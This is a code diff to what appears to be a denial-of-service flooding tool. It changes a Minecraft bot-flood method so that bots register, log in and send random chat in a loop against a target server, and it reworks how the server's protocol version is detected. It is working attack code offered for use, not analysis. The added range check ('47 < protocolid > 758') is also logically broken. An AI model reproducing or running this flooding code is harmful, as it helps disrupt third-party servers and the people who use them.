@@ -520,9 +520,8 @@ class Layer4(Thread):
             Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
             Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))
 
-            while Tools.send(s, Minecraft.keepalive(self.protocolid, ProxyTools.Random.rand_int(1111111, 9999999))):
-                Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(100))))
-                sleep(.05)
+            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
+                sleep(1.1)
 
         Tools.safe_close(s)
 
@@ -1661,15 +1660,18 @@ if __name__ == '__main__':
                         else:
                             logger.setLevel("DEBUG")
                 
-                protocolid = 47
+                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                 
                 if method == "MCBOT":
                     with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                         Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                         Tools.send(s, Minecraft.data(b'\x00'))
 
-                        protocolid = Tools.protocolRex.search(str(s.recv(256)))
-                        protocolid = 47 if not protocolid else int(protocolid.group(1))
+                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
+                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
+                        
+                        if 47 < protocolid > 758:
+                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
 
                 for _ in range(threads):
                     Layer4((target, port), ref, method, event,
